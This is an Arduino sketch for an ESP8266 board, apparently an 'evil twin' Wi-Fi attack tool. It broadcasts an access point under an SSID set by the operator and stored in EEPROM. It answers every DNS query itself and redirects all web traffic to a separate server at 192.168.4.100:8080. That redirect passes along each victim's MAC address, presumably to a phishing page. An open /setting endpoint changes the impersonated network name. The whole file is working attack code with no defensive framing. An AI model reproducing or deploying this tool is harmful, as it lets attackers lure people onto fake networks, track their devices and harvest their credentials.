
/*
  ESP8266 DarkFi Cative Portal
  By 7wp81x (github.com/MrP1r4t3)
*/


#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <EEPROM.h>
#include <FS.h>

IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
ESP8266WebServer webServer(80);
const byte DNS_PORT = 53;
String webString="";
String serialString="";
String essid;


extern "C" {
    #include <user_interface.h>  
}


// esp8266 blink
void blink(int n){
    for(int i = 0; i < n; i++){
        digitalWrite(LED_BUILTIN, LOW);    
        delay(250);                    
        digitalWrite(LED_BUILTIN, HIGH);  
        delay(250);
    }
}

// Get client MAC address
String GetStatus() {
    String macaddr;
    struct station_info *stat_info;
    stat_info = wifi_softap_get_station_info();
    if (stat_info != NULL) {
        macaddr = String( stat_info->bssid[0], HEX )+":"+
            String( stat_info->bssid[1], HEX )+":"+
            String( stat_info->bssid[2], HEX )+":"+
            String( stat_info->bssid[3], HEX )+":"+
            String( stat_info->bssid[4], HEX )+":"+
            String( stat_info->bssid[5], HEX)+" ";
        return macaddr;
    }
    return "Unknown";
}


// redirect to local server
void RedirectReq() {
    String client_mac = GetStatus();
    webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    webServer.sendHeader("Pragma", "no-cache");
    webServer.sendHeader("Expires", "-1");
    webServer.sendHeader("Location", "http://192.168.4.100:8080/client.php?id="+client_mac,true);
    webServer.send(302, "text/html","");
}


void setup() {
    Serial.begin(9600);
    pinMode(LED_BUILTIN, OUTPUT);
    digitalWrite(LED_BUILTIN, HIGH);
    EEPROM.begin(512);
  
    // Get essid on epprom
    for (int i = 0; i < 32; ++i) {
        essid += char(EEPROM.read(i));
    }

    WiFi.setOutputPower(20.5);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, netMsk);{
    WiFi.softAP(essid.c_str());
    
    delay(500);

    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(DNS_PORT, "*", apIP);
    webServer.on("/", RedirectReq);
    webServer.onNotFound(RedirectReq);
    webServer.on("/setting", []() {
        String qsid;
        qsid = webServer.arg("ssid");
        if (qsid.length() > 0) {
            for (int i = 0; i < 32; ++i) {
                EEPROM.write(i, 0);
            }
            for (int i = 0; i < qsid.length(); ++i) {
                EEPROM.write(i, qsid[i]);
            }
            EEPROM.commit();
            blink(1);
            delay(5000);
            ESP.reset();
        }
  
    });
    webServer.begin();
    blink(5);

    }
}


void loop() {
    dnsServer.processNextRequest();
    webServer.handleClient();
}
